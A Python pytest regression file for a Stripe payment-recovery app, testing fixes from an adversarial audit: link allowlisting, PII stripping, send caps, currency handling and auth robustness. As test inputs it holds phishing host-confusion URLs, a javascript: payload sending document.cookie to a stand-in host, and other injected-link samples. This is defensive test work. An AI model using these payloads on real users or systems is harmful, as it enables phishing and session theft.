"""Regression tests for defects found by an adversarial audit.

Each test names the concrete attack or failure it prevents. These are the
findings, not hypotheticals: every one was reproduced against this code before
being fixed.
"""

from __future__ import annotations

import pytest

from app import loop, mailer, stripe_client
from app.money import minor_to_major
from app.safety import find_foreign_urls
from app.store import Store

# ---------------------------------------------------------------------------
# Link allowlist: parser-confusion bypass
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("url", [
    "https://phish.attacker.test#@invoice.stripe.com/pay/in_123",
    "https://evil.test?x=@billing.stripe.com",
    "https://evil.test:8080#@billing.stripe.com",
    "https://evil.test\\@billing.stripe.com",
    "https://user:pw@evil.test/billing.stripe.com",
    "HTTPS://EVIL.TEST#@BILLING.STRIPE.COM",
    "https://billing.stripe.com.evil.test/x",
])
def test_host_confusion_urls_are_blocked(url):
    """Splitting on "/" and "@" let a phishing link through as the sanctioned
    card-update URL. A browser treats "#", "?" and "\\" as delimiters too, so
    the allowlisted host ended up in the fragment while the real host was the
    attacker's."""
    assert find_foreign_urls(url) == [url]


@pytest.mark.parametrize("url", [
    "https://billing.stripe.com/p/session/test_abc",
    "https://invoice.stripe.com/i/acct_1/xyz",
    "https://pay.stripe.com/invoice/abc",
])
def test_genuine_stripe_links_still_pass(url):
    assert find_foreign_urls(url) == []


def test_a_crafted_link_from_stripe_is_rejected(monkeypatch):
    """recovery_link re-checks whatever the upstream returned."""
    monkeypatch.setattr(
        stripe_client, "create_portal_session",
        lambda cid: "https://evil.test#@billing.stripe.com/p/session/x",
    )
    from app.safety import PAYMENT_UPDATE_URL

    assert stripe_client.recovery_link(stripe_customer_id="cus_1") == PAYMENT_UPDATE_URL


# ---------------------------------------------------------------------------
# PII must not reach the model
# ---------------------------------------------------------------------------

def test_event_pii_is_stripped_before_the_prompt():
    """The customer record was masked, but the prompt also embedded a repr of
    the raw event, and Stripe's customer_name/customer_email live there."""
    from app.nodes import _event_for_prompt

    event = {
        "customer_id": "cus_1", "amount": 49.0, "failure_code": "card_expired",
        "customer_name": "Alice Smith", "customer_email": "alice@example.test",
    }
    text = str(_event_for_prompt(event))
    assert "Alice Smith" not in text
    assert "alice@example.test" not in text
    assert "card_expired" in text, "non-PII fields must survive"


# ---------------------------------------------------------------------------
# Dedupe must not swallow an event that failed to process
# ---------------------------------------------------------------------------

def test_a_failed_event_can_be_retried(tmp_path):
    """Claiming an event then failing to process it is worse than not claiming
    it: Stripe retries, the retry hits the dedupe row, and the event is lost.
    A lost invoice.paid is revenue never recorded as recovered."""
    store = Store(tmp_path / "t.db")
    try:
        assert store.mark_event_seen("evt_1", "invoice.paid") is True
        store.forget_event("evt_1")  # processing raised
        assert store.mark_event_seen("evt_1", "invoice.paid") is True
    finally:
        store.close()


# ---------------------------------------------------------------------------
# Currency exponents
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("minor,currency,expected", [
    (500000, "jpy", 500000.0),   # zero-decimal: /100 under-reported by 100x
    (4900, "eur", 49.0),
    (4900, "usd", 49.0),
    (4900, "kwd", 4.9),          # three-decimal: /100 over-reported by 10x
    (0, "jpy", 0.0),
])
def test_amounts_respect_the_currency_exponent(minor, currency, expected):
    assert minor_to_major(minor, currency) == expected


def test_report_uses_the_right_exponent(isolated_store):
    from app.report import build_report

    isolated_store.record_failure(
        invoice_id="in_jp", customer_id="c", amount_minor=500000,
        currency="jpy", failure_code="card_expired",
    )
    bucket = build_report(isolated_store)["by_currency"]["jpy"]
    assert bucket["failed_value"] == 500000.0


# ---------------------------------------------------------------------------
# Sequence cap and cooldown: business-level dedup
# ---------------------------------------------------------------------------

def _row(invoice_id="in_1", customer="cus_1"):
    return {
        "customer_email": "me@mine.test", "failure_code": "card_expired",
        "stripe_customer_id": customer, "customer_id": customer,
    }


def _record(store, invoice_id="in_1", customer="cus_1"):
    """deliver_recovery transitions to messaged on a send, which needs the row."""
    store.record_failure(
        invoice_id=invoice_id, customer_id=customer, amount_minor=4900,
        currency="eur", failure_code="card_expired", stripe_customer_id=customer,
    )


@pytest.fixture
def sending_on(monkeypatch):
    monkeypatch.setenv("PAYPILOT_SEND_EMAIL", "1")
    monkeypatch.setenv("RESEND_API_KEY", "re_test")
    monkeypatch.setenv("PAYPILOT_ALLOWED_RECIPIENTS", "*")
    monkeypatch.setattr(stripe_client, "create_portal_session",
                        lambda cid: "https://billing.stripe.com/p/session/x")

    class _Resp:
        status_code = 200
        content = b"{}"

        @staticmethod
        def json():
            return {"id": "rs_1"}

    monkeypatch.setattr("httpx.post", lambda *a, **k: _Resp())
    return monkeypatch


def test_touches_are_capped_per_invoice(isolated_store, sending_on):
    """Stripe emits invoice.payment_failed once per retry, each with its own
    event id, so event dedupe does not bound this. Without a cap, five retries
    meant five emails to the same person."""
    sending_on.setenv("PAYPILOT_MAX_TOUCHES", "2")
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "0")
    _record(isolated_store)

    statuses = [
        loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                              row=_row(), store=isolated_store)["status"]
        for _ in range(5)
    ]
    assert statuses.count(mailer.STATUS_SENT) == 2
    assert statuses[-1] == "suppressed"
    assert isolated_store.sent_message_count("in_1") == 2


def test_a_cooldown_blocks_a_second_email_about_the_same_invoice(isolated_store, sending_on):
    """Business-level dedup, not transport dedup: two DIFFERENT, legitimate
    events about the same invoice must not both reach the customer."""
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")
    _record(isolated_store)

    first = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                  row=_row(), store=isolated_store)
    second = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                   row=_row(), store=isolated_store)

    assert first["status"] == mailer.STATUS_SENT
    assert second["status"] == "suppressed"
    assert second["error"] == "cooldown_active"
    assert second["hours_remaining"] > 23


def test_the_cooldown_also_spans_invoices_for_one_customer(isolated_store, sending_on):
    """A billing run failing three of one customer's invoices produces three
    distinct events. They must not become three emails within minutes."""
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")

    isolated_store.record_failure(invoice_id="in_a", customer_id="cus_1",
                                  amount_minor=1000, currency="eur",
                                  failure_code="card_expired",
                                  stripe_customer_id="cus_1")
    isolated_store.record_failure(invoice_id="in_b", customer_id="cus_1",
                                  amount_minor=2000, currency="eur",
                                  failure_code="card_expired",
                                  stripe_customer_id="cus_1")

    a = loop.deliver_recovery(invoice_id="in_a", recovery={"message": "hi"},
                              row=_row("in_a"), store=isolated_store)
    b = loop.deliver_recovery(invoice_id="in_b", recovery={"message": "hi"},
                              row=_row("in_b"), store=isolated_store)

    assert a["status"] == mailer.STATUS_SENT
    assert b["status"] == "suppressed"
    assert b["error"] == "cooldown_active"


def test_a_different_customer_is_not_blocked(isolated_store, sending_on):
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")

    isolated_store.record_failure(invoice_id="in_a", customer_id="cus_1",
                                  amount_minor=1000, currency="eur",
                                  failure_code="card_expired",
                                  stripe_customer_id="cus_1")
    isolated_store.record_failure(invoice_id="in_b", customer_id="cus_2",
                                  amount_minor=1000, currency="eur",
                                  failure_code="card_expired",
                                  stripe_customer_id="cus_2")

    loop.deliver_recovery(invoice_id="in_a", recovery={"message": "hi"},
                          row=_row("in_a", "cus_1"), store=isolated_store)
    b = loop.deliver_recovery(invoice_id="in_b", recovery={"message": "hi"},
                              row=_row("in_b", "cus_2"), store=isolated_store)
    assert b["status"] == mailer.STATUS_SENT


def test_a_dry_run_does_not_start_a_cooldown(isolated_store, monkeypatch):
    """Only mail that reached a person may suppress the next send."""
    monkeypatch.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")
    monkeypatch.setattr(stripe_client, "create_portal_session",
                        lambda cid: "https://billing.stripe.com/p/session/x")
    _record(isolated_store)

    first = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                  row=_row(), store=isolated_store)
    assert first["status"] == mailer.STATUS_DRY_RUN
    assert loop._cooldown_remaining(
        isolated_store, invoice_id="in_1", stripe_customer_id="cus_1"
    ) == 0.0


# ---------------------------------------------------------------------------
# Second audit round
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "Update your card at paypilot-billing.tk/update",
    "Go to //paypilot-billing.tk/update",
    "javascript:fetch('//x.tk?c='+document.cookie)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "billing.stripe.com.paypilot-billing.tk/update",
    "Hi Acme (verify at acme-billing-secure.tk/pay), we tried...",
])
def test_links_without_a_scheme_are_still_caught(payload):
    """Hardening _host_of was not enough: the URL EXTRACTION regex only matched
    https:// and www., so a bare "evil.tk/update" in an invoice line
    description was invisible to the allowlist and shipped in real copy. Mail
    clients linkify it."""
    from app.safety import message_violations

    assert message_violations(payload, allow_hosts=False)


def test_ordinary_copy_is_not_flagged_as_a_link():
    """The broadened pattern must not suppress legitimate sends."""
    from app import templates
    from app.safety import find_foreign_urls

    for code in ("card_expired", "insufficient_funds", "generic_decline"):
        for kind in ("diagnosis", "message", "subject"):
            text = templates.render(kind, code, name="Dana Fox", plan="Pro Plan")
            assert find_foreign_urls(text) == [], f"{kind}/{code}"


@pytest.mark.parametrize("value", ["inf", "1e400", "-inf", "nan"])
def test_absurd_holdout_values_clamp_rather_than_crash(monkeypatch, value):
    """float("inf") parses then explodes on int(). Escaping would 500 every
    failed-payment event and stop all dunning."""
    from app.attribution import holdout_pct

    monkeypatch.setenv("PAYPILOT_HOLDOUT_PCT", value)
    assert 0 <= holdout_pct() <= 100


def test_an_already_paid_invoice_is_never_dunned(isolated_store, sending_on):
    """Stripe can deliver a retry's payment_failed after the invoice was paid.
    Emailing someone who has already paid is the worst message this sends."""
    from app.store import STATE_RECOVERED

    _record(isolated_store)
    isolated_store.transition("in_1", STATE_RECOVERED, recovered_amount_minor=4900)

    result = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                   row=_row(), store=isolated_store)
    assert result["status"] == "suppressed"
    assert result["error"] == "invoice_already_recovered"
    assert isolated_store.sent_message_count("in_1") == 0


def test_churn_then_pay_is_acknowledged_not_a_500(isolated_store):
    """A legal Stripe sequence. A 500 makes Stripe retry for days, then give up,
    losing the recovery entirely."""
    from app.store import STATE_CHURNED

    _record(isolated_store)
    isolated_store.transition("in_1", STATE_CHURNED, reason="test")

    event = {"id": "evt_p", "type": "invoice.paid", "data": {"object": {
        "object": "invoice", "id": "in_1", "customer": "cus_1",
        "amount_paid": 4900, "currency": "eur"}}}
    result = loop.handle_recovery(event, isolated_store)

    assert result["handled"] is True, "must acknowledge, not raise"
    assert result["reason"] == "illegal_transition"


def test_a_bounce_does_not_hand_back_send_budget(isolated_store, sending_on):
    """Counting only 'sent' let a bounce reset the cap, so a dead mailbox got
    MORE mail than a live one."""
    sending_on.setenv("PAYPILOT_MAX_TOUCHES", "1")
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "0")
    _record(isolated_store)

    first = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                  row=_row(), store=isolated_store)
    assert first["status"] == mailer.STATUS_SENT
    mailer.mark_bounced("rs_1", isolated_store)

    second = loop.deliver_recovery(invoice_id="in_1", recovery={"message": "hi"},
                                   row=_row(), store=isolated_store)
    assert second["status"] == "suppressed"
    assert second["error"] == "max_touches_reached"


def test_cooldown_still_applies_without_a_stripe_customer_id(isolated_store, sending_on):
    """The per-customer window silently vanished when Stripe's id was absent."""
    sending_on.setenv("PAYPILOT_SEND_COOLDOWN_HOURS", "24")
    for inv in ("in_a", "in_b"):
        isolated_store.record_failure(
            invoice_id=inv, customer_id="local_cus_1", amount_minor=1000,
            currency="eur", failure_code="card_expired", stripe_customer_id=None,
        )

    row = {"customer_email": "me@mine.test", "failure_code": "card_expired",
           "stripe_customer_id": None, "customer_id": "local_cus_1"}
    a = loop.deliver_recovery(invoice_id="in_a", recovery={"message": "hi"},
                              row=row, store=isolated_store)
    b = loop.deliver_recovery(invoice_id="in_b", recovery={"message": "hi"},
                              row=row, store=isolated_store)
    assert a["status"] == mailer.STATUS_SENT
    assert b["error"] == "cooldown_active"


def test_idempotency_key_cannot_replay_another_clients_data(monkeypatch):
    """The key is unauthenticated and caller-chosen. Keyed on its raw value, a
    second caller got back the FIRST caller's customer name, plan and amount."""
    from fastapi.testclient import TestClient

    from app import api as api_module

    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    client = TestClient(api_module.app)
    payload = {"customer_id": "cust_001", "amount": 1499.0, "currency": "usd",
               "failure_code": "card_expired", "attempt": 1}
    headers = {"Idempotency-Key": "guessable-key"}

    victim = client.post("/payment-failed", json=payload,
                         headers={**headers, "Fly-Client-IP": "203.0.113.1"})
    attacker = client.post("/payment-failed",
                           json={**payload, "customer_id": "cust_002", "amount": 1.0},
                           headers={**headers, "Fly-Client-IP": "198.51.100.9"})

    assert victim.status_code == 200 and attacker.status_code == 200
    assert attacker.json()["impact"]["amount_at_risk"] != 1499.0


# ---------------------------------------------------------------------------
# Third audit round
# ---------------------------------------------------------------------------

def _batch_env(monkeypatch):
    import app.ingest as ingest_module

    class _Doc:
        page_content = "playbook"

    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setattr(
        ingest_module, "_retriever",
        type("R", (), {"invoke": lambda self, q: [_Doc()]})(),
    )


def test_batch_count_and_money_describe_the_same_invoices(monkeypatch):
    """count spanned all currencies while the money came from one bucket, so a
    mixed run reported "3 invoices, EUR 1800" having silently dropped the USD
    invoice's money."""
    _batch_env(monkeypatch)
    from app.graph import run_recovery_batch

    def ev(cur, amt):
        return {"customer_id": "cust_001", "amount": amt, "currency": cur,
                "failure_code": "card_expired", "attempt": 1}

    agg = run_recovery_batch([ev("usd", 100), ev("eur", 900), ev("eur", 900)])["aggregate"]
    assert agg["total_count"] == 3, "every invoice is still counted somewhere"
    # count now matches the bucket the money came from: two EUR invoices.
    assert agg["currency"] == "EUR"
    assert agg["count"] == 2
    assert agg["total_at_risk"] == agg["by_currency"]["EUR"]["total_at_risk"]


def test_batch_headline_does_not_depend_on_arrival_order(monkeypatch):
    """Same billing run, different order, produced EUR 10.00 or GBP 5000.00."""
    _batch_env(monkeypatch)
    from app.graph import run_recovery_batch

    def ev(cur, amt):
        return {"customer_id": "cust_001", "amount": amt, "currency": cur,
                "failure_code": "card_expired", "attempt": 1}

    a = run_recovery_batch([ev("eur", 10), ev("gbp", 5000)])["aggregate"]
    b = run_recovery_batch([ev("gbp", 5000), ev("eur", 10)])["aggregate"]
    assert (a["currency"], a["total_at_risk"]) == (b["currency"], b["total_at_risk"])


def test_a_hostile_portal_return_url_is_not_sent_to_stripe(monkeypatch):
    """It fires right after the customer types their card number."""
    from app.safety import PAYMENT_UPDATE_URL
    from app.stripe_client import _return_url

    monkeypatch.setenv("PAYPILOT_PORTAL_RETURN_URL", "javascript:alert(1)")
    assert _return_url() == PAYMENT_UPDATE_URL

    monkeypatch.setenv("PAYPILOT_PORTAL_RETURN_URL", "https://evil.test/steal")
    assert _return_url() == PAYMENT_UPDATE_URL


def test_templates_snapshot_cannot_corrupt_the_shared_cache():
    """load() hands out the live cache; one mutation would rewrite customer
    copy process-wide."""
    from app import templates

    snap = templates.snapshot()
    snap["message"]["card_expired"] = "POISONED"
    assert "POISONED" not in templates.get("message", "card_expired")


def test_access_log_records_a_prefix_not_a_full_ip():
    """A full IP is personal data, and this product is pitched at payments."""
    from app import api as api_module

    class _Req:
        headers = {"fly-client-ip": "203.0.113.42"}
        client = None

    assert api_module._client_prefix(_Req()) == "203.0.113.0/24"


# ---------------------------------------------------------------------------
# Fourth audit round
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("header", ["deadbeéf", "Bearer éé", "t=1,v1=ÿ"])
def test_non_ascii_headers_do_not_crash_auth(header):
    """Starlette decodes headers as latin-1, and hmac.compare_digest raises
    TypeError on non-ASCII str. Two bytes from an unauthenticated client turned
    every rejection into a 500 - and skipped the security audit event, so the
    input most likely to be an attacker was the one that did not alert."""
    from app.auth import verify_bearer, verify_webhook_signature
    from app.stripe_map import verify_stripe_signature

    assert verify_bearer(header, "token") is False
    assert verify_webhook_signature(b"x", header, "secret") is False
    assert verify_stripe_signature(b"x", f"t=1,v1={header}", "secret") is False


def test_valid_credentials_still_pass():
    """The byte-comparison fix must not break the happy path."""
    import hashlib
    import hmac
    import time

    from app.auth import verify_bearer
    from app.stripe_map import verify_stripe_signature

    assert verify_bearer("Bearer tok", "tok") is True
    ts = int(time.time())
    sig = hmac.new(b"sec", f"{ts}".encode() + b".{}", hashlib.sha256).hexdigest()
    assert verify_stripe_signature(b"{}", f"t={ts},v1={sig}", "sec") is True


@pytest.mark.parametrize("name", [
    "Konstantin Bergstrom 900012345",   # 7+ digit run
    "Acme Trading Ltd 08123456",        # company registration number
    "A" * 81,                           # over length
])
def test_one_predicate_decides_whether_a_name_is_safe(name):
    """Two validators disagreed: the template filler checked only URLs and
    secrets while the PII masker also rejected digit runs and long strings, so
    a name failing the second but passing the first reached the prompt RAW."""
    from app.nodes import _safe_field
    from app.pii import name_is_safe

    assert name_is_safe(name) is False
    assert _safe_field(name, "there") == "there"


@pytest.mark.parametrize("pan", [
    "4242424242424242", "4242 4242 4242 4242", "4242-4242-4242-4242",
])
def test_card_numbers_are_masked_with_or_without_separators(pan):
    """A human typing a card into a support reply writes it spaced. Luhn was
    also being computed over the separators."""
    from app.pii import scrub_freeform

    assert "{{CARD}}" in scrub_freeform(pan)


def test_non_card_digit_runs_survive():
    from app.pii import scrub_freeform

    assert scrub_freeform("order 12345 ref") == "order 12345 ref"


@pytest.mark.parametrize("payload", ["mailto:billing@evil.tk", "tel:+1234567890"])
def test_hostless_schemes_are_rejected(payload):
    """Documented as caught, never actually extracted. An injected reply-to is
    a phishing vector on a message that already asks about payment."""
    from app.safety import message_violations

    assert message_violations(payload, allow_hosts=False)


@pytest.mark.parametrize("prose", [
    "The file invoice.pdf is attached.",
    "Read the docs at readme.md",
    "password: please do not share it with anyone",
])
def test_ordinary_prose_is_not_mistaken_for_a_link_or_secret(prose):
    """The guard fails CLOSED, so a false positive silently discards real copy
    and flips fallback_used for no reason."""
    from app.safety import message_violations

    assert message_violations(prose) == []


def test_a_late_failure_cannot_rewrite_a_closed_invoices_amount(isolated_store):
    """Preserving only the state let a late payment_failed move "value at risk"
    retroactively while "value recovered" stayed fixed, so the dashboard's money
    columns stopped reconciling."""
    from app.store import STATE_RECOVERED

    isolated_store.record_failure(invoice_id="in_t", customer_id="c",
                                  amount_minor=10000, currency="eur",
                                  failure_code="card_expired")
    isolated_store.transition("in_t", STATE_RECOVERED, recovered_amount_minor=10000)
    isolated_store.record_failure(invoice_id="in_t", customer_id="c",
                                  amount_minor=99999999, currency="eur",
                                  failure_code="card_expired", attempt_count=4)

    row = isolated_store.get_failure("in_t")
    assert row["amount_minor"] == 10000, "closed invoice keeps its amount"
    assert row["attempt_count"] == 4, "the attempt is still recorded"


def test_a_2xx_with_a_non_json_body_still_records_the_send(isolated_store, monkeypatch):
    """A CDN interstitial returning 200 + HTML raised past the caller, losing
    the record of a message that may have been delivered."""
    monkeypatch.setenv("PAYPILOT_SEND_EMAIL", "1")
    monkeypatch.setenv("RESEND_API_KEY", "re_test")
    monkeypatch.setenv("PAYPILOT_ALLOWED_RECIPIENTS", "*")

    class _Resp:
        status_code = 200
        content = b"<html>proxy</html>"

        @staticmethod
        def json():
            raise ValueError("not json")

    monkeypatch.setattr("httpx.post", lambda *a, **k: _Resp())
    result = mailer.send_dunning_email(invoice_id="in_1", to="a@b.test",
                                       subject="s", body="b", store=isolated_store)
    assert result["status"] == mailer.STATUS_SENT
    assert len(isolated_store.messages_for("in_1")) == 1


def test_a_broken_embedding_key_does_not_stop_dunning(monkeypatch):
    """An expired key would otherwise 500 every event until Stripe gives up."""
    import app.ingest as ingest_module

    monkeypatch.setattr(ingest_module, "_retriever", None)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-invalid")
    monkeypatch.setattr(ingest_module, "_build_retriever",
                        lambda: (_ for _ in ()).throw(RuntimeError("401")))

    retriever = ingest_module.get_retriever()
    assert retriever is not None
    assert retriever.invoke("card expired"), "falls back to the lexical retriever"


def test_a_new_pii_field_is_excluded_by_default():
    """The strip is an allowlist, not a denylist. A denylist is correct only
    until someone adds a field: a future receipt_email would have gone to the
    model verbatim with no test failing."""
    from app.nodes import _event_for_prompt

    event = {
        "customer_id": "cus_1", "amount": 49.0, "currency": "eur",
        "failure_code": "card_expired", "attempt": 1,
        "receipt_email": "leak@example.test",       # hypothetical future field
        "customer_phone": "+447700900000",
        "customer_name": "Dana Fox",
    }
    safe = _event_for_prompt(event)
    assert "leak@example.test" not in str(safe)
    assert "+447700900000" not in str(safe)
    assert "Dana Fox" not in str(safe)
    assert safe["failure_code"] == "card_expired", "useful fields survive"
